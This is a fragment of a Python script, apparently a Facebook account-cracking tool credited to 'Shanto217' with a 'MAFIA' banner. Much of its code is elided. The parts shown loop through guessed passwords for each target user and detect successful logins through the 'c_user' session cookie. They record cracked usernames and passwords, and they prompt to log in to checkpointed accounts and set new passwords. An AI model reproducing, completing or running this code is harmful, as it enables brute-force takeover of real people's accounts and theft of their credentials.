...
\033[1;92m╔══o00════════00o═════════════════════════╗
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mAuthor    :  \033[1;92m Shanto217           \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  :  \033[1;92m MAFIA              \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mWhatsapp  : \033[1;92m  MAFIA217         \033[1;31;1m █
\033[1;31;1m█ \033[1;92m [•] \033[1;31;1mVersion   :  \033[1;92m 0.1.                 \033[1;31;1m█
\033[1;92m╚═════════════════════════════════════════╝""")
#CRACK SELESAI
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        print(f'\n%s══════════════════════════════════════════\n [%s✓%s] %sCracking By Shanto Usercrack...\n%s══════════════════════════════════════════'%(N,H,N,H,N))
        ...
        if cek_cp =="":
            ...
            if ww in ("Y","y","ya"):
                ubahP.append("y")
                print(f" {N}[{H}•{N}] Password example : {H}Shanto123{N}")
                ...
                if len(pwBar) <= 5:
                    ...
                    pwBaru.append(pwBar)
            for SHANTO in cp:
                SHANTO = SHANTO.replace('\n', '')
                titid  = SHANTO.split(' • ')
                print(f'{N}══════════════════════════════════════════\n {H}LOGIN PROCESS')
                jalan(f' {N}[{M}?{N}] Account : {K}{SHANTO.replace("[SHANTO-CP] ", "")}{N}')
                try:
                    log_hasil(titid[0].replace("[SHANTO-CP] ", ""), titid[1])
...
# PROSES CRACK METODE 3 in 1
    def __metode__(self, cebok, user, pasw):
        global ok,cp,loop
        animasi = random.choice(["\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]","\x1b[1;92m[Shanto]"])
            ...
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        wrt = '[SHANTO-CP] %s • %s • %s %s %s' % (user,pw,day,month,year)
                        cp.append(wrt)
